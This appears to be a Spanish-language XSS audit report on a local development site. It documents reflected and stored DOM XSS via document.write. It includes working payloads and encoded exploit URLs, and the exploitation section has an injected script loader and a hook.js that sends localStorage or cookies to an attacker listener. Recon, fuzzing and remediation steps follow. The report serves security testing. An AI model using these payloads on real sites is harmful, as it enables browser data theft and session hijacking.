# Informe de auditoria XSS

- Objetivo: `http://web.dev.local:8082`
- Fecha de analisis: `2026-04-21T05:55:38Z`
- Resultado: **Se confirmaron y explotaron vulnerabilidades XSS**

## Resumen ejecutivo

La aplicacion presenta dos vulnerabilidades XSS basadas en DOM:

1. **XSS reflejado / DOM XSS** en el parametro `search`.
2. **XSS almacenado / DOM Stored XSS** en los parametros `name` y `comment`, persistido en `localStorage` y renderizado despues con `document.write()`.

La causa raiz es el uso de `URLSearchParams` para leer parametros de la URL y su insercion posterior en el DOM mediante `document.write()` sin ningun tipo de sanitizacion o escaping.

## Hallazgos tecnicos

### 1) XSS reflejado basado en DOM (`search`)

Codigo vulnerable observado en la pagina principal:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');
...
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

Payload de confirmacion:

```text
</strong><img src=x onerror=console.log("REF_SEARCH")>
```

URL de prueba:

```text
http://web.dev.local:8082/?search=%3C%2Fstrong%3E%3Cimg%20src%3Dx%20onerror%3Dconsole.log%28%22REF_SEARCH%22%29%3E
```

Evidencia obtenida con navegador automatizado (`puppeteer`):

```text
PAGE_CONSOLE:POC_SEARCH
RESULTS search:true stored:true
```

Impacto: ejecucion arbitraria de JavaScript en el navegador de la victima al visitar una URL manipulada.

### 2) XSS almacenado basado en DOM (`name`, `comment`)

Codigo vulnerable observado:

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');
...
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));
...
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Payload de confirmacion almacenada:

```text
<img src=x onerror=console.log("POC_STORED")>
```

URL usada para almacenar el payload:

```text
http://web.dev.local:8082/?name=attacker&comment=%3Cimg%20src%3Dx%20onerror%3Dconsole.log%28%22POC_STORED%22%29%3E
```

Evidencia:

```text
PAGE_CONSOLE:POC_STORED
RESULTS search:true stored:true
```

Impacto: cualquier visitante que cargue la pagina despues de almacenar el payload ejecutara JavaScript arbitrario desde el comentario persistido.

## Explotacion activa realizada

Se realizo una explotacion controlada del XSS almacenado mediante inyeccion de un hook externo y exfiltracion de datos del navegador a un listener local del atacante.

Payload final de explotacion:

```html
<img src=x onerror="var s=document.createElement('script');s.src='http://127.0.0.1:9117/hook.js';document.body.appendChild(s)">
```

El `hook.js` servido por el listener local ejecuto:

```javascript
console.log('HOOK_LOADED');
(new Image()).src='http://127.0.0.1:9117/hooked?data='+encodeURIComponent(localStorage.getItem('comments')||document.cookie||'');
```

Evidencia de explotacion exitosa:

```text
PAGE_CONSOLE:HOOK_LOADED
HITS:["/hook.js","/hooked?data=%5B%7B%22name%22%3A%22attacker%22%2C%22comment%22%3A%22%3Cimg%20src%3Dx%20onerror%3D%5C%22var%20s%3Ddocument.createElement(%27script%27)%3Bs.src%3D%27http%3A%2F%2F127.0.0.1%3A9117%2Fhook.js%27%3Bdocument.body.appendChild(s)%5C%22%3E%22%2C%22date%22%3A%224%2F21%2F2026%2C%205%3A58%3A27%20AM%22%7D%5D", "/hook.js", "/hooked?data=%5B%7B%22name%22%3A%22attacker%22%2C%22comment%22%3A%22%3Cimg%20src%3Dx%20onerror%3D%5C%22var%20s%3Ddocument.createElement(%27script%27)%3Bs.src%3D%27http%3A%2F%2F127.0.0.1%3A9117%2Fhook.js%27%3Bdocument.body.appendChild(s)%5C%22%3E%22%2C%22date%22%3A%224%2F21%2F2026%2C%205%3A58%3A27%20AM%22%7D%5D"]
```

Esto confirma:

- carga de JavaScript externo controlado por atacante;
- capacidad de hooking del navegador;
- exfiltracion de datos desde `localStorage` (y potencialmente `document.cookie` si existieran cookies accesibles desde JavaScript).

## Comandos utilizados

### Reconocimiento basico

```bash
curl -sSI http://web.dev.local:8082
curl -sL http://web.dev.local:8082
```

### Enumeracion rapida de parametros y formularios

```bash
python - <<'PY'
import requests,re
from urllib.parse import urljoin
from bs4 import BeautifulSoup
base='http://web.dev.local:8082'
html=requests.get(base,timeout=10).text
soup=BeautifulSoup(html,'html.parser')
for i,f in enumerate(soup.find_all('form'),1):
    print('FORM',i,'action=',f.get('action'),'method=',f.get('method','get'))
    for inp in f.find_all(['input','textarea','select']):
        print(inp.name, inp.get('name'), inp.get('type'))
PY
```

### Fuzzing ligero con `wfuzz`

```bash
wfuzz -z list,'%3C,%3E,%22,%27,%3Cimg%20src%3Dx%20onerror%3D1%3E' -u 'http://web.dev.local:8082/?search=FUZZ' --hc 404
```

### Confirmacion con navegador automatizado

```bash
node /app/reports/xss_poc.js
```

Salida relevante:

```text
PAGE_CONSOLE:POC_SEARCH
PAGE_CONSOLE:POC_STORED
RESULTS search:true stored:true
```

### Explotacion controlada

Se uso un script Node.js con `puppeteer` y un servidor HTTP local para servir `/hook.js` y recibir la exfiltracion de datos.

## Impacto real

- robo de datos del navegador (cookies accesibles por JS, `localStorage`, `sessionStorage`);
- secuestro de sesion si la aplicacion almacenara tokens accesibles desde JavaScript;
- ejecucion de acciones en nombre de la victima;
- carga de hooks externos tipo BeEF/hook.js;
- persistencia del payload XSS para futuras visitas en el caso del comentario almacenado.

## Recomendaciones

1. Eliminar el uso de `document.write()` para datos controlados por usuario.
2. Renderizar texto con `textContent` / `innerText` en lugar de HTML.
3. Aplicar escaping contextual segun el sink HTML/atributo/JavaScript.
4. Validar y sanitizar `search`, `name` y `comment` antes de usarlos.
5. Implementar una CSP estricta que bloquee scripts inline y cargas externas no confiables.
6. Evitar almacenar contenido no confiable en `localStorage` sin sanitizar.
7. Marcar cookies sensibles como `HttpOnly`, `Secure` y `SameSite`.

## Conclusiones

El objetivo `http://web.dev.local:8082` es vulnerable a **DOM XSS reflejado** y **DOM XSS almacenado**. Ambas vulnerabilidades fueron confirmadas, y la variante almacenada fue explotada con exito mediante carga de un script externo y exfiltracion controlada de datos del navegador.
